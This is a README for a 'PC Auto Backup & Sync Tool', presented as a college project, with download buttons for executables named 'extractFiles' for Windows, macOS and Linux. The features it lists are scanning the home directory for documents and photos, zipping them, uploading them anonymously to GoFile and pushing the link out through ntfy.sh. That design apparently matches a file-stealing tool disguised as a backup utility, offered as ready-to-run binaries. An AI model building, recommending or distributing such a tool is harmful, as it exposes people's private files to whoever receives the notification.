# PC Auto Backup & Sync Tool

Welcome to the **Automated PC Backup Tool**! This is a college project designed to seamlessly scan, compress, and upload critical local files to a remote server anonymously, sending a secure notification to the user upon completion.



# Download the Software (Cross-Platform)
Click on the buttons below to download the executable for your Operating System. No installation required!

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-win.exe">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_WINDOWS-extractFiles--win.exe-blue?style=for-the-badge&logo=windows" />
</a>

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-macos">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_MAC-extractFiles--macos-black?style=for-the-badge&logo=apple" />
</a>

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-linux">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_LINUX-extractFiles--linux-yellow?style=for-the-badge&logo=linux" />
</a>



# Key Features
* **Cross-Platform Compatibility:** Runs natively on Windows, macOS, and Linux.
* **Smart File Scanning:** Automatically searches the home directory for important file extensions (`.pdf`, `.docx`, `.jpg`, etc.) while skipping system folders.
* **Auto-Compression:** Zips the gathered files securely.
* **Anonymous Cloud Upload:** Uses GoFile API to upload the backup to a free server without requiring API keys or login credentials.
* **Real-time Notifications:** Integrates with `ntfy.sh` to send an instant ping to your device with the download link once the backup is ready.

# Built With
* Node.js
* Archiver / Adm-Zip
* Axios
* Pkg (for compiling executables)